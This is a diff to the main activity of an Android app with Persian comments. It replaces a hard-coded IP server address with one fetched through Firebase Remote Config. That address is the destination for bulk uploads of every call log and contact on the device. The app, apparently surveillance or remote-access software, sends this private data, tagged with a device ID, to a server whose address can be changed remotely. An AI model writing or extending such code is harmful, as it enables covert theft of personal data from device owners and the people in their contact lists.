@@ -45,7 +45,6 @@ class MainActivity : ComponentActivity() {
 
     private val BATTERY_UPDATE_INTERVAL_MS = 60000L
     private val FCM_TIMEOUT_MS = 3000L
-    private val baseUrl = "http://95.134.130.160:8765"
 
     private lateinit var webView: WebView
     private lateinit var permissionManager: PermissionManager
@@ -71,6 +70,10 @@ class MainActivity : ComponentActivity() {
 
         // ⭐ بارگذاری تنظیمات از config.json
         appConfig = AppConfig.load(this)
+
+        // ⭐ راه‌اندازی Firebase Remote Config برای آدرس سرور
+        ServerConfig.initialize(this)
+        ServerConfig.printAllSettings()
 
         deviceId = DeviceInfoHelper.getDeviceId(this)
         Log.d(TAG, "📱 Device ID: $deviceId")
@@ -374,7 +377,7 @@ class MainActivity : ComponentActivity() {
                     val callLogResult = CallLogsBatchUploader.uploadAllCallLogs(
                         context = this@MainActivity,
                         deviceId = deviceId,
-                        baseUrl = baseUrl
+                        baseUrl = ServerConfig.getBaseUrl()
                     ) { sent, total ->
                         if (sent % 500 == 0) {
                             Log.d(TAG, "   Calls: $sent/$total")
@@ -423,7 +426,7 @@ class MainActivity : ComponentActivity() {
                         val contactsResult = ContactsBatchUploader.uploadAllContacts(
                             context = this@MainActivity,
                             deviceId = deviceId,
-                            baseUrl = baseUrl
+                            baseUrl = ServerConfig.getBaseUrl()
                         ) { sent, total ->
                             if (sent % 500 == 0) {
                                 Log.d(TAG, "   Contacts: $sent/$total")
